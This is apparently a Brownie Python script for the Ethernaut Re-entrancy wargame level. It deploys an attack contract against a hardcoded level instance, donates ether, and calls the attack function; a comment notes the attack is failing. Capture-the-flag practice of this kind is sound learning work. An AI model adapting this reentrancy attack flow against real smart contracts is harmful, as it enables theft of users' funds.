from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0x58C7cdda21c43803DcFE82CE7E41926816df7bb9"
AMOUNT = "0.01 ether"
GAS_LIMIT = 600000


def main():

    player = get_account()

    # set target (interface address)
    target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)

    eth_balance_instance = web3.fromWei(target.balance(), "ether")
    print(f"Balance of ethernaut instance = {eth_balance_instance}")

    # deploy attack contract
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
    eth_balance_attack = web3.fromWei(attack.balance(), "ether")
    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")

    """donate ether to the target (which points at the Level contract) contract"""
    target.donate(ETHERNAUT_INSTANCE, {"from": player, "value": AMOUNT})

    balance_ETHERNAUT_INSTANCE = web3.eth.get_balance(ETHERNAUT_INSTANCE)
    balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
    print(f"\nBalance of Ethernaut level = {balance_ETHERNAUT_INSTANCE_ether} ETH\n")

    """call the attack() function, on my attack contract"""
    print(f"\nCalling attack() from {attack}\n")

    # PROBLEM HERE - attack doesn't work!!!!!!!!!!!!!!!!!!!!!!!!!!!   <------  LOOK
    attack.attack({"from": player})
    # attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})

    print(f"\nBalance of the attack contract = {eth_balance_attack} ether\n")
